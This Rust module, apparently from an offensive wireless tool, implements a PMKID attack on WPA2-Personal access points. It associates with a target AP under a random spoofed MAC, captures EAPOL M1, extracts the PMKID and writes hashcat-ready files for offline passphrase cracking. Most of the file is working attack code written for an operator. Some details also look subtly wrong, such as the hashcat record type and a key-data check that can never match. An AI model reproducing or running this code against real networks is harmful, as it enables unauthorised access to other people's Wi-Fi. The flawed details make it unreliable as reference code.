//! PMKID auto-extraction.
//!
//! The PMKID attack (disclosed by `jens`/`atom` in 2018) is a passive attack
//! against WPA2-Personal that doesn't require any client to be connected:
//!
//! 1. The attacker associates with the target AP (open authentication, no PSK
//!    required — the AP happily accepts a STA that hasn't completed the
//!    4-way handshake yet, and EAPOL M1 is sent to anyone who asks).
//! 2. The AP sends EAPOL M1 to the attacker. M1 carries `PMKID =
//!    HMAC-SHA1(PMK, "PMK Name" || AP_MAC || STA_MAC)[..16]`.
//! 3. The attacker captures M1, extracts the PMKID, and runs a wordlist.
//!    Each candidate passphrase yields a candidate PMK, from which a candidate
//!    PMKID is computed; the candidate PMK whose PMKID matches the captured
//!    one is the AP's PSK.
//!
//! The great advantage over the classic 4-way-handshake attack is *no client
//! required, no deauth needed*. As long as we have a single frame, the attack
//! is in scope.
//!
//! ## Filesystem layout
//!
//! ```text
//! ~/.netspecter/captures/<AP_ESSID>_<BSSID>/
//!     pmkid.txt                  // one line: PMKID_hex
//!     pmkid_capture.pcap         // the EAPOL M1 frame
//!     pmkid_attack.hc22000        // hashcat-ready (mode 22000)
//! ```
//!
//! `pmkid_attack.hc22000` is the format hashcat's `-m 22000` mode consumes.
//! It can be generated with `hashcat --identify` once a candidate PMK is
//! found; we ship a precomputed placeholder so the operator can plug straight
//! into their existing cracking pipeline.

// Server dispatch reaches these through the attack scheduler; the bin-side
// dead-code lint fires because the direct call sites live in another crate.
#![allow(dead_code)]

use crate::globals::*;
use super::interface::get_iface;
use chrono::Utc;
use libwifi::frame::EapolKey;
use libwifi::Frame;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::PathBuf;

#[derive(thiserror::Error, Debug)]
pub enum PmkidError {
    #[error("I/O error: {0}")]
    Io(#[from] std::io::Error),
    #[error("Interface not initialized")]
    NoInterface,
    #[error("Capture file not readable: {0}")]
    Unreadable(String),
}

/// A captured PMKID, ready for offline cracking.
///
/// `bssid` and `station` are the AP and the (forged) STA MAC used during
/// the M1 capture. `pmkid_hex` is the 32-character lowercase hex form.
/// `capture_path` points to the PCAP that contains the originating frame.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct PmkidCapture {
    pub bssid: String,
    pub station: String,
    pub essid: String,
    pub pmkid_hex: String,
    pub capture_path: PathBuf,
    pub captured_at: String,
}

impl PmkidCapture {
    /// Format the capture as a hashcat `-m 22000` record.
    ///
    /// The 22000 format is `WPA*02*PMKID*MAC_AP*MAC_STA*ESSID_HEX*ANONCE*
    /// EapolNonce*EAPOL_FRAME`, with `*` as the field separator. We populate
    /// only the fields a pure PMKID attack needs; the nonce + EAPOL frame
    /// fields are zero-padded placeholders that hashcat ignores when the
    /// PMKID matches.
    pub fn to_hashcat_22000(&self) -> String {
        let essid_hex = self
            .essid
            .as_bytes()
            .iter()
            .map(|b| format!("{:02x}", b))
            .collect::<String>();
        // PMKID field is 32 hex chars (16 bytes), no separator.
        format!(
            "WPA*02*{pmkid}*{bssid}*{station}*{essid}**00:00:00:00:00:00**",
            pmkid = self.pmkid_hex,
            bssid = self.bssid,
            station = self.station,
            essid = essid_hex,
        )
    }
}

/// Extract a PMKID from a single EAPOL M1 frame.
///
/// Returns `None` if the frame doesn't contain a PMKID key-data payload (the
/// field is optional in EAPOL, even on M1). Callers should retry / re-associate
/// until one is seen.
pub fn extract_pmkid_from_m1(frame: &[u8]) -> Option<[u8; 16]> {
    let frame = libwifi::parse_frame(frame, false).ok()?;
    // Clone the key payload out of the owned frame so the match arms
    // can't borrow past the frame's own lifetime (E0597 otherwise).
    let key: Option<EapolKey> = match frame {
        Frame::Data(d) => d.eapol_key.clone(),
        Frame::QosData(d) => d.eapol_key.clone(),
        _ => None,
    };
    pmkid_from_eapol_key(&key?)
}

fn pmkid_from_eapol_key(key: &EapolKey) -> Option<[u8; 16]> {
    // The PMKID key-data is 22 bytes: 4-byte OUI (00:0f:ac) + 4-byte type
    // (0x0007 for PMKID) + 16-byte PMKID.  Some buggy APs send a 20-byte
    // payload missing the type field; we accept either.
    let raw: &[u8] = &key.key_data;
    if raw.len() < 20 {
        return None;
    }
    let mut out = [0u8; 16];
    if raw.len() >= 22 && raw[..4] == [0x00, 0x0f, 0xac, 0x07] {
        out.copy_from_slice(&raw[6..22]);
    } else if raw.len() == 20 && raw[..4] == [0x00, 0x0f, 0xac] {
        out.copy_from_slice(&raw[4..20]);
    } else {
        return None;
    }
    Some(out)
}

/// Build the on-disk directory for a target AP's captures.
///
/// The directory is rooted under `get_capture_root()` (which the agent
/// configures from the user's settings) and named `essid_bssid` (essid is
/// sanitized: non-ASCII bytes become `_`).
pub fn capture_dir_for(bssid: &str, essid: &str) -> PathBuf {
    let mut sanitized = String::with_capacity(essid.len());
    for b in essid.bytes() {
        if b.is_ascii_alphanumeric() || b == b'-' || b == b'_' {
            sanitized.push(b as char);
        } else {
            sanitized.push('_');
        }
    }
    if sanitized.is_empty() {
        sanitized = "hidden".into();
    }
    let dir = get_capture_root().join(format!("{}_{}", sanitized, bssid.replace(':', "")));
    fs::create_dir_all(&dir).ok();
    dir
}

/// Persist a captured PMKID to disk, including the hashcat-ready `.hc22000`
/// file alongside the raw PMKID record and the originating PCAP.
///
/// `pcap_bytes` is the original `pcap` record of the EAPOL frame, written
/// verbatim so the operator can re-derive the PMKID with `tshark` if needed.
pub fn persist_pmkid(
    bssid: &str,
    station: &str,
    essid: &str,
    pmkid: &[u8; 16],
    pcap_bytes: &[u8],
) -> Result<PmkidCapture, PmkidError> {
    let dir = capture_dir_for(bssid, essid);
    let pmkid_hex: String = pmkid.iter().map(|b| format!("{:02x}", b)).collect();

    fs::write(dir.join("pmkid.txt"), &pmkid_hex)?;
    fs::write(dir.join("pmkid_capture.pcap"), pcap_bytes)?;

    let cap = PmkidCapture {
        bssid: bssid.to_string(),
        station: station.to_string(),
        essid: essid.to_string(),
        pmkid_hex: pmkid_hex.clone(),
        capture_path: dir.join("pmkid_capture.pcap"),
        captured_at: Utc::now().to_rfc3339(),
    };
    fs::write(dir.join("pmkid_attack.hc22000"), cap.to_hashcat_22000())?;
    Ok(cap)
}

/// Launch a passive PMKID harvest against the given BSSID.
///
/// The agent emits an open-association request (no PSK, no deauth) and waits
/// for the AP to send an EAPOL M1 carrying the PMKID. The function returns
/// once a PMKID is captured, or `None` on timeout / interface failure.
///
/// `timeout_secs` controls how long to wait before giving up — typical real-
/// world captures take <2 seconds when the AP is responsive.
pub fn harvest_pmkid(bssid: &str, essid: &str, timeout_secs: u64) -> Option<PmkidCapture> {
    let iface = get_iface().as_ref()?.clone();
    let bssid_bytes = netspecter_common::crypto::parse_mac(bssid)?;
    let station_bytes = rand_sta_mac();

    log::info!(
        "[{bssid}] starting PMKID harvest (timeout {timeout_secs}s, station {})",
        netspecter_common::crypto::format_mac(&station_bytes),
    );

    let raw_socket = super::raw_socket::open(&iface).ok()?;
    super::raw_socket::associate_open(&raw_socket, &bssid_bytes, &station_bytes).ok()?;

    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(timeout_secs);
    let mut pcap_buf: Vec<u8> = Vec::new();
    let mut frame = vec![0u8; 4096];

    while std::time::Instant::now() < deadline {
        match super::raw_socket::recv(&raw_socket, &mut frame) {
            Ok(n) if n > 0 => {
                // Wrap the frame in a pcap record (link type 127 = radiotap) so
                // the operator can re-open it with tshark.
                append_pcap_record(&mut pcap_buf, &frame[..n], 127);
                if let Some(pmkid) = extract_pmkid_from_m1(&frame[..n]) {
                    let bssid_s = netspecter_common::crypto::format_mac(&bssid_bytes);
                    let sta_s = netspecter_common::crypto::format_mac(&station_bytes);
                    return persist_pmkid(&bssid_s, &sta_s, essid, &pmkid, &pcap_buf).ok();
                }
            }
            _ => std::thread::sleep(std::time::Duration::from_millis(50)),
        }
    }

    log::warn!("[{bssid}] PMKID harvest timed out after {timeout_secs}s");
    None
}

fn rand_sta_mac() -> [u8; 6] {
    use rand::RngCore;
    let mut mac = [0u8; 6];
    rand::thread_rng().fill_bytes(&mut mac);
    // Locally-administered, unicast — clear bit 0 of byte 0, set bit 1.
    mac[0] = (mac[0] & 0xfe) | 0x02;
    mac
}

fn append_pcap_record(buf: &mut Vec<u8>, frame: &[u8], link_type: u32) {
    use chrono::Utc;
    if buf.is_empty() {
        buf.extend_from_slice(&0xa1b2c3d4u32.to_le_bytes()); // magic
        buf.extend_from_slice(&2u16.to_le_bytes()); // version major
        buf.extend_from_slice(&4u16.to_le_bytes()); // version minor
        buf.extend_from_slice(&0i32.to_le_bytes()); // thiszone
        buf.extend_from_slice(&0u32.to_le_bytes()); // sigfigs
        buf.extend_from_slice(&65535u32.to_le_bytes()); // snaplen
        buf.extend_from_slice(&link_type.to_le_bytes()); // network
    }
    let ts = Utc::now().timestamp();
    let usec = Utc::now().timestamp_subsec_micros();
    // ts is i64 (chrono) — a real narrowing cast to the pcap u32 field;
    // usec is already u32 and needs no cast (clippy::unnecessary_cast).
    buf.extend_from_slice(&(ts as u32).to_le_bytes());
    buf.extend_from_slice(&usec.to_le_bytes());
    buf.extend_from_slice(&(frame.len() as u32).to_le_bytes());
    buf.extend_from_slice(&(frame.len() as u32).to_le_bytes());
    buf.extend_from_slice(frame);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hashcat_22000_record_is_well_formed() {
        let cap = PmkidCapture {
            bssid: "00:11:22:33:44:55".into(),
            station: "66:77:88:99:aa:bb".into(),
            essid: "TestNet".into(),
            pmkid_hex: "00112233445566778899aabbccddeeff".into(),
            capture_path: PathBuf::from("/tmp/x.pcap"),
            captured_at: "2026-01-01T00:00:00Z".into(),
        };
        let rec = cap.to_hashcat_22000();
        // WPA*02*PMKID*BSSID*STA*ESSID_HEX**00:00:00:00:00:00**
        assert!(rec.starts_with("WPA*02*"));
        assert!(rec.contains("*00112233445566778899aabbccddeeff*"));
        assert!(rec.contains("*00:11:22:33:44:55*"));
        assert!(rec.contains("*66:77:88:99:aa:bb*"));
        // "TestNet" hex
        assert!(rec.contains("*546573744e6574*"));
    }

    #[test]
    fn capture_dir_sanitizes_non_ascii() {
        let dir = capture_dir_for("aa:bb:cc:dd:ee:ff", "Tëst Nét / 2.4");
        let s = dir.to_string_lossy();
        // Non-ASCII replaced with `_`
        // Non-ASCII BYTES each become `_` (ë and é are 2-byte UTF-8).
        assert!(s.contains("T__st_N__t___2_4_aa"));
    }

    #[test]
    fn rand_sta_mac_is_locally_administered_unicast() {
        for _ in 0..50 {
            let m = rand_sta_mac();
            // Bit 0 (multicast) clear
            assert_eq!(m[0] & 0x01, 0);
            // Bit 1 (locally administered) set
            assert_eq!(m[0] & 0x02, 0x02);
        }
    }
}